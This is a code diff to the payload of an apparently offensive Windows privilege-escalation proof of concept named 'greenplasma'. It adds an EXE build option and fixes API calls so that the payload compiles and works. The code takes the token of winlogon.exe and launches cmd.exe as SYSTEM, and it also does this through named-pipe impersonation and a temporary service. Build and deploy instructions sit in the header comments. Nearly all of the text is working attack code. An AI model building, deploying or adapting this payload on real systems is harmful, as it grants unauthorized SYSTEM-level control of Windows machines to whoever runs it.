@@ -6,7 +6,8 @@
 // it spawns a SYSTEM-level shell.
 //
 // Build (x64 Native Tools Command Prompt):
-//   cl /EHsc /LD /Fe:greenplasma_payload.dll payload.cpp /link advapi32.lib
+//   DLL:  cl /EHsc /LD /Fe:greenplasma_payload.dll payload.cpp /link advapi32.lib
+//   EXE:  cl /EHsc /DSTANDALONE_EXE /Fe:greenplasma_payload.exe payload.cpp /link advapi32.lib shell32.lib
 //
 // Deploy: Copy to C:\Temp\greenplasma_payload.dll (or modify path in PoC.cpp)
 
@@ -33,15 +34,15 @@ BOOL SpawnSystemShell_CreateProcess() {
     DWORD winlogonPid = 0;
     HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (hSnap != INVALID_HANDLE_VALUE) {
-        PROCESSENTRY32 pe32 = { 0 };
-        pe32.dwSize = sizeof(PROCESSENTRY32);
-        if (Process32First(hSnap, &pe32)) {
+        PROCESSENTRY32W pe32 = { 0 };
+        pe32.dwSize = sizeof(PROCESSENTRY32W);
+        if (Process32FirstW(hSnap, &pe32)) {
             do {
                 if (_wcsicmp(pe32.szExeFile, L"winlogon.exe") == 0) {
                     winlogonPid = pe32.th32ProcessID;
                     break;
                 }
-            } while (Process32Next(hSnap, &pe32));
+            } while (Process32NextW(hSnap, &pe32));
         }
         CloseHandle(hSnap);
     }
@@ -81,7 +82,7 @@ BOOL SpawnSystemShell_CreateProcess() {
     SetTokenInformation(hDupToken, TokenSessionId, &sessionId, sizeof(sessionId));
 
     // Launch cmd.exe as SYSTEM in the user's session
-    STARTUPINFO si = { 0 };
+    STARTUPINFOW si = { 0 };
     PROCESS_INFORMATION pi = { 0 };
     si.cb = sizeof(si);
     si.dwFlags = STARTF_USESHOWWINDOW;
@@ -89,6 +90,8 @@ BOOL SpawnSystemShell_CreateProcess() {
 
     WCHAR cmdline[] = L"cmd.exe";
     bResult = CreateProcessAsUserW(
+        hDupToken,
+        NULL,           // Application name
         cmdline,        // Command line (writable copy)
         NULL, NULL,      // Process/Thread security
         FALSE,           // Inherit handles
@@ -167,7 +170,7 @@ BOOL SpawnSystemShell_NamedPipe() {
                 ProcessIdToSessionId(GetCurrentProcessId(), &sessionId);
                 SetTokenInformation(hDupToken, TokenSessionId, &sessionId, sizeof(sessionId));
 
-                STARTUPINFO si = { 0 };
+                STARTUPINFOW si = { 0 };
                 PROCESS_INFORMATION pi = { 0 };
                 si.cb = sizeof(si);
                 si.dwFlags = STARTF_USESHOWWINDOW;
@@ -175,6 +178,7 @@ BOOL SpawnSystemShell_NamedPipe() {
 
                 WCHAR cmdline[] = L"cmd.exe";
                 bResult = CreateProcessAsUserW(
+                    hDupToken, NULL, cmdline,
                     NULL, NULL, FALSE, CREATE_NEW_CONSOLE,
                     NULL, NULL, &si, &pi);
 
@@ -209,7 +213,7 @@ BOOL SpawnSystemShell_Service() {
     WCHAR svcDisplay[] = L"Green Plasma Test Service";
     WCHAR svcPath[] = L"cmd.exe /c start cmd.exe";
 
-    hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
+    hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
     if (!hSCM) {
         OutputDebugStringA("[Payload] Failed to open SCM\n");
         return FALSE;
@@ -217,6 +221,7 @@ BOOL SpawnSystemShell_Service() {
 
     // Create service (will fail if it already exists, which is fine)
     hService = CreateServiceW(
+        hSCM, svcName, svcDisplay,
         SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
         SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
         svcPath, NULL, NULL, NULL, NULL, NULL);
@@ -227,7 +232,7 @@ BOOL SpawnSystemShell_Service() {
     }
 
     if (hService) {
-        StartService(hService, 0, NULL);
+        StartServiceW(hService, 0, NULL);
         OutputDebugStringA("[Payload] Service started\n");
 
         // Clean up: delete the service after use
